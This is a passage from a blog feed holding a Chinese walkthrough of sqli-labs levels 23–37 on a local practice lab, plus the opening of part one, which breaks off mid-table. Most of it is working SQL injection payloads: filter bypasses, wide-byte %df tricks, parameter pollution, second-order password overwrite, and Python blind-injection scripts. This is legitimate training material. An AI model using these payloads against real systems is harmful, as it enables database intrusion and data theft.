      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(二)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-2/"/>
    <id>0verwatch.top/2018/08/29/sqli-labs-training-2/</id>
    <published>2018-08-29T12:01:26.000Z</published>
    <updated>2018-08-29T12:15:57.643Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h3><p>从这里开始应该是有做了防护，我们可以边看源代码练习代码审计，一边学习各种过waf的技巧了<a id="more"></a><br>这一题查看源代码的话发现注释符被过滤掉了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">"/#/"</span>;</span><br><span class="line">$reg1 = <span class="string">"/--/"</span>;</span><br><span class="line">$replace = <span class="string">""</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br></pre></td></tr></table></figure><p>但其实对于这一句SQL语句，我们可以直接单引号闭合而不用注释去把后面的东西给省略掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-23/?id=1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>直接报出数据库，此题完结</p><h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>这一题应该是设计二次注入的题目<br>在CTF题目里面的话肯定是要你获取admin的账号然后改变admin的密码用admin账号登录获取flag<br>这里主要关键是pass_change.php这里面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' "</span></span><br></pre></td></tr></table></figure><p>若我们在修改密码的时候<br>注册一个<code>admin’#</code>的用户就是为了后期能够使这一句话后面的内容全都注释的，从而直接更新的是<code>admin</code>的用户名<br>这时候的语句就会变成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=<span class="string">'$pass'</span> where username=<span class="string">'admin'</span></span><br></pre></td></tr></table></figure><p>改你想要密码，然后退出在直接用admin登录就好</p><h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>这一题看源代码会发现有一个黑名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把or还有AND都会替换成为<code>&quot;&quot;</code>，这里是大小写都会被拦截下来的<br>这时候其实可以有几个办法能够绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）大小写变形Or,OR,oR</span><br><span class="line">（2）编码，hex，urlencode</span><br><span class="line">（3）添加注释/*or*/</span><br><span class="line">（4）利用符号and=&amp;&amp; or=||</span><br><span class="line">（5）双写绕过</span><br></pre></td></tr></table></figure><p>输入一个单引号会出现单引号的报错，所以我们尝试闭合一下<br><code>http://127.0.0.1/sqlilabs/Less-25/?id=1%27 %23</code> 成功出现回显 </p><p>我这里选择用双写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; aandnd updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><p>符号绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25/?id=1&apos; || updatexml(1,concat(0x7e,database(),0x7e),1) %23</span><br></pre></td></tr></table></figure><h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>跟上面一题同样的过滤方式，语句变简单了，不用单引号去闭合<br>但是这一题不能再用报错注入，因为源码中把报错信息给注释掉了，可以用盲注，我们需要用的是union注入或者是盲注<br>union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-25a/?id=-1 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>再来一个二分法盲注，通过注入成功还会显示登录名这个标志</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-25a/?id=1 aandnd ascii(substr(database(),&#123;_&#125;,1))&gt;&#123;__&#125;%23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><p>注意 上面这两关在写到关于information这个单词的时候，需要注意它里面存在or，我们需要双写绕过</p><h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>输入?id=’会出现单引号的报错<br>但是想用注释符去闭合发现没效果，再用<code>?id=1&#39; or &#39;1&#39;=&#39;1</code>去尝试发现回显成功，这有可能就是注释符被过滤了<br>看看源代码，果然黑名单被过滤了，空格也被过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out spaces</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没关系，这样我们也可以使用报错注入，这里空格要想绕过的话不能够用注释了，我们可以用<code>%a0</code>，但是我们也可以用无空格报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-26/?id=1&apos; ||updatexml(1,concat(0x7e,database(),0x7e),1)||&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>用%a0也可以注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sql/Less-26/?id=1&apos;%a0anandd%a0updatexml(1,concat(0x7e,(select%a0group_concat(table_name)%a0from%a0infoorrmation_schema.TABLES</span><br><span class="line">%a0where%a0TABLE_SCHEMA=database()),0x7e),1)%a0anandd%0a&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>此处我们需要说明两方面：对于<code>注释</code>和结尾字符的我们此处只能利用<br>构造一个<code>’</code> 来闭合后面到<code>’</code> ；<br>对于空格，有较多的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB 键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return 功能</span><br><span class="line">%0b TAB 键（垂直）</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure></p><p>注意上面的编码绕不过的话我们可以用Linux环境测试</p><p>Less-26a<br>只是查询的句子变了，多了一个括号，这一题也不能报错<br>我们可以用盲注<br><a href="http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr" target="_blank" rel="noopener">http://127.0.0.1/sqlilabs/Less-26a/?id=1&#39;)%a0aandnd%a0ascii(substr(database(),1,1))=115%a0oorr</a>(‘1’=’1</p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>这里发现源代码里面的黑名单又壮大了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);<span class="comment">//strip out /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out --.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);<span class="comment">//Strip out #.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out spaces.</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out SELECT</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out Union</span></span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们任然可以用双写绕过，也可以用大小写绕过，但是我们直接报错注入就行了不用麻烦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-27/?id=1&apos;and%a0updatexml(1,concat(0x7e,database(),0x7e),1)%a0and&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>这一题就是源代码把报错注入的回显给注释掉<br>那我们用盲注就好<br>双引号闭合</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-27a/?id=1"and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;"&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><p>这一题把<code>union select</code>无论大小写都过滤掉了，把上面那几题能够双写绕过的全都封杀掉了<br>这一题只能够盲注，不能报错注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.103/sqlilabs/Less-28/?id=1')and(ascii(substr((SelEct(database())),&#123;_&#125;,1)))&gt;('&#123;__&#125;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9</span>):</span><br><span class="line">    Min = <span class="number">67</span></span><br><span class="line">    Max =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(Max-Min)&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (Max+Min)//<span class="number">2</span></span><br><span class="line">        payload = url.format(_=i,__=mid)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Your Login name:Dumb'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">            Min = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            Max = mid</span><br><span class="line">    database += chr(Max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><p>这一题跟上面一题区别不大，也是用盲注，也可以用<code>union注入</code>，只是不要出现+号就好<br>忙著自己闭合单引号和括号就行<br>这里我用的是union注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-28a/?id=-1%27)unIon(SeLect%201,database(),%273</span><br></pre></td></tr></table></figure><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><p>这一题好像是涉及到二层服务的问题，里面的有一个叫HPP(http参数污染)攻击<br>但是没关系就是第一个参数通过了第一层服务器的waf过滤结果第二个参数没有过滤，这是因为apache的特性，只获取最后一个参数<br>这里我们是可以直接用单引号闭合就ok</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-29/?id=1&amp;id=-1%27%20union%20select%201,database(),3%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><p>同上面的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line">$hint=$qs;</span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br></pre></td></tr></table></figure><p>就是先利用了这个Tomcat去做waf过滤，其实对第二个参数不起作用<br>这次直接闭合双引号就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-30/?id=1&amp;id=-1&quot; union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>Less-31<br>这一题就是SQL查询语句变了一下，我们需要闭合双引号和括号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-31/?id=1&amp;id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>这一题我一开始没有头绪，因为所有参数都被转义了，不能够闭合，后来发现是另外的绕过方法，原来是宽字节的问题<br>原理：mysql 在使用GBK 编码的时候，会认为两个字符为一个汉字，例如<code>%aa%5c</code> 就是一个汉字（前一个ascii 码大于128 才能到汉字的范围）。我们在过滤<code>’</code> 的时候，往往利用的思路是将<code>‘</code> 转换为<code>\’</code><br>因此我们在此想办法将‘ 前面添加的\ 除掉，一般有两种思路：</p><ol><li><code>%df</code> 吃掉<code>\</code> 具体的原因是urlencode(\‘) = <code>%5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形成<code>%df%5c%27</code>，而上面提到的mysql 在GBK 编码方式的时候会将两个字节当做一个汉字，此事<code>%df%5c</code> 就是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</li><li>将<code>\’</code> 中的<code>\</code> 过滤掉，例如可以构造<code>%**%5c%5c%27</code> 的情况，后面的%5c 会被前面的<code>%5c</code>给注释掉。这也是bypass 的一种方法。</li></ol><p>看源代码我们利用单引号闭合然后加上%df就好，这里我们可以用union注入也可以用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-32/?id=-1%df%27union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>这个同上面那题一模一样直接闭合单引号就好，是就是上面写的check函数应该是作者自己写的，这一题是直接调用了系统的函数<br>对比一下两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          <span class="comment">//escape any backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);    </span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-33/?id=-1%df%27 union select 1,database(),3 %23</span><br></pre></td></tr></table></figure><p>这里面怎么防范呢？<br>使用addslashes(),我们需要将mysql_query 设置为<code>binary</code> 的方式，才能防御此漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mysql_query(“SET character_set_connection=gbk,character_set_result=gbk,character_set_client=binary”,$conn);</span><br></pre></td></tr></table></figure><p>这时候我想到了我当时做的一个题目好像utf8_general_ci可以用编码去绕过，但是那个是在mysql服务端起作用的</p><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>这一题换了post的模式但是利用方法还是有点不同的，<br>本关是post 型的注入漏洞，同样的也是将post 过来的内容进行了‘ \ 的处理。由上面的例子可以看到我们的方法就是将过滤函数添加的\ 给吃掉。而get 型的方式我们是以url 形式提交的，因此数据会通过URLencode，如何将方法用在post 型的注入当中，我们此处介绍一个新的方法。将utf-8 转换为utf-16 或utf-32，例如将<code>‘</code> 转为utf-16 为<code>♦&#39;</code>  。我们就<br>可以利用这个方式进行尝试。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=♦&apos; or 1=1#&amp;passwd=1&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>但也可以直接用%df绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;passwd=ade3&amp;submit=Submit</span><br></pre></td></tr></table></figure><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>这一题水，根本没有使用任何引号不需要闭合，它的转义也是多余的，直接报错就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-35/?id=1%20and%20updatexml(1,concat(0x7e,database(),0x7e),1)%20%23</span><br></pre></td></tr></table></figure><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><p>这一关里面用了<code>mysql_real_escape_string</code>函数去进行过滤<br>是因mysql 我们并没有设置成gbk，所以<code>mysql_real_escape_string()</code>依旧能够被突破。方法<br>和上述是一样的。<br>用utf-16绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%ef%bf%bd%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><p>用%df去绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.103/sqlilabs/Less-36/?id=-1%df%27 union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><p>有报错输出选择报错注入，就是post方式的宽字节<br>uname=admin%df’ and updatexml(1,concat(0x7e,database(),0x7e),1)# &amp;passwd=admin&amp;submit=Submit</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>SQLi-LABS(Adv)这一部分的题目完结，这一部分主要是对输入的数据进行了过滤和防护，但是都过滤得不全，<br>还是会存在多种绕过的方法，这一部分学到了新的知识，就是用utf-16编码绕过宽字节的那一部分内容，其实这里的宽字节前提条件是需要客户端里面设置了gbk，服务端跟过程没有设置同样的编码导致的，所以开发的时候得注意，另外的话这里边的二次注入的题目也是很值得推敲的，也学到了新知识，就是服务器两层架构以及http参数污染的应用，有点意思。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;Less-23&quot;&gt;&lt;a href=&quot;#Less-23&quot; class=&quot;headerlink&quot; title=&quot;Less-23&quot;&gt;&lt;/a&gt;Less-23&lt;/h3&gt;&lt;p&gt;从这里开始应该是有做了防护，我们可以边看源代码练习代码审计，一边学习各种过waf的技巧了
    
    </summary>
    
      <category term="SQL注入" scheme="0verwatch.top/categories/SQL%E6%B3%A8%E5%85%A5/"/>
    
    
      <category term="SQL注入" scheme="0verwatch.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>sqli-labs实战记录(一)</title>
    <link href="0verwatch.top/2018/08/29/sqli-labs-training-1/"/>
    <id>0verwatch.top/2018/08/29/sqli-labs-training-1/</id>
    <published>2018-08-29T12:01:04.000Z</published>
    <updated>2018-08-29T12:10:13.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近啊先自己SQL注入确实不行，我只能拿出sql注入的基础部分来练练收了，这个实验环境是sqlilabs<a id="more"></a></p><p>一些前置知识<br>系统函数<br>介绍几个常用函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br></pre></td></tr></table></figure><p>字符串连接函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure><p>一般用于尝试的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td 